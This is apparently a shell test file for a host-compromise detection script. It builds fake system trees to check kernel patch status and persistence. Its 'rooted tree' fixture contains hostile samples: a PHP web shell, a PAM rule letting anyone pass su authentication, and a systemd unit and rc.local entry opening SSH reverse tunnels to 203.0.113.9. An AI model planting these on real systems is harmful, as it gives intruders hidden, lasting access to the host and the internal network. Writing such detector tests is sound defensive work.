#!/bin/sh
# Tests for stage2.sh. Builds fake root trees in a temp folder.
set -u
here=$(cd "$(dirname "$0")" && pwd)
# shellcheck source=tests/lib.sh
. "$here/../tests/lib.sh"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

mk() { # mk <root> : a clean Debian-like tree
  r=$1
  mkdir -p "$r/etc/pam.d" "$r/etc/modprobe.d" "$r/etc/systemd/system" "$r/var/www/html" "$r/boot"
  printf 'auth sufficient pam_rootok.so\n@include common-auth\n' > "$r/etc/pam.d/su"
  printf 'auth [success=1 default=ignore] pam_unix.so nullok\nauth requisite pam_deny.so\nauth required pam_permit.so\n' > "$r/etc/pam.d/common-auth"
  printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > "$r/etc/modprobe.d/fragnesia.conf"
  printf '[Service]\nExecStart=/usr/sbin/nginx\n' > "$r/etc/systemd/system/web.service"
  printf '<?php echo "hello"; ?>\n' > "$r/var/www/html/index.php"
  : > "$r/mods"; : > "$r/proc"; : > "$r/verify"
  printf "linux (6.8.0-124.124) noble; urgency=medium\n  * CVE-2026-46300\n" > "$r/changelog"
}

clean="$work/clean"; mk "$clean"
run_check "clean tree" env BC_ROOT="$clean" BC_UNAME_R=6.8.0-124-generic BC_KERNELS="6.8.0-124-generic" \
  BC_KCHANGELOG="$clean/changelog" BC_LSMOD="$clean/mods" BC_PROC_LIST="$clean/proc" \
  BC_VERIFY_OUT="$clean/verify" BC_NO_DIRECT=1 sh "$here/stage2.sh"
expect_code 0
expect_out "mentions CVE-2026-46300"
expect_out "blocked in modprobe.d: esp4 esp6 rxrpc"

hit="$work/hit"; mk "$hit"
printf 'auth sufficient pam_permit.so\n' > "$hit/etc/pam.d/su"
printf 'esp4 16384 0 - Live 0x0\n' > "$hit/mods"
rm "$hit/etc/modprobe.d/fragnesia.conf"
printf '[Service]\nExecStart=/usr/bin/ssh -N -R 8443:10.0.0.5:636 -D 1080 op@203.0.113.9\nRestart=always\n' > "$hit/etc/systemd/system/net-helper.service"
printf '#!/bin/sh\nnohup /usr/bin/ssh -fN -R 3389:10.0.0.7:3389 op@203.0.113.9 &\nexit 0\n' > "$hit/etc/rc.local"
printf 'root 1200 1 /usr/bin/ssh -N -R 8443:10.0.0.5:636 op@203.0.113.9\n' > "$hit/proc"
printf '??5??????  c /etc/pam.d/su\n' > "$hit/verify"
# shellcheck disable=SC2016
printf '<?php @system($_GET["c"]); ?>\n' > "$hit/var/www/html/.x.php"
: > "$hit/changelog"
run_check "rooted tree" env BC_ROOT="$hit" BC_UNAME_R=6.8.0-100-generic BC_KERNELS="6.8.0-100-generic 6.8.0-124-generic" \
  BC_KCHANGELOG="$hit/changelog" BC_LSMOD="$hit/mods" BC_PROC_LIST="$hit/proc" \
  BC_VERIFY_OUT="$hit/verify" BC_NO_DIRECT=1 sh "$here/stage2.sh"
expect_code 1
expect_out "installed but not running"
expect_out "does not mention CVE-2026-46300"
expect_out "loaded: esp4"
expect_out "lets pam_permit satisfy auth"
expect_out "package verify: ??5??????  c /etc/pam.d/su"
expect_out "unit or init script with a tunnel command"
expect_out "tunnel command in .*rc.local"
expect_out "running tunnel"
expect_out "small PHP file that runs request input"

run_check "upstream fallback" env BC_ROOT="$clean" BC_UNAME_R=6.12.80 BC_KERNELS=6.12.80 BC_KCHANGELOG=/nonexistent \
  BC_LSMOD="$clean/mods" BC_PROC_LIST="$clean/proc" BC_VERIFY_OUT="$clean/verify" BC_NO_DIRECT=1 sh "$here/stage2.sh"
expect_code 1
expect_out "below the fixed stable release 6.12.91"

run_check "direct read on real files" env BC_ROOT="$clean" BC_UNAME_R=6.8.0-124-generic BC_KERNELS=6.8.0-124-generic \
  BC_KCHANGELOG="$clean/changelog" BC_LSMOD="$clean/mods" BC_PROC_LIST="$clean/proc" BC_VERIFY_OUT="$clean/verify" sh "$here/stage2.sh"
expect_code 0

run_check "bad option" sh "$here/stage2.sh" --nope
expect_code 2

finish
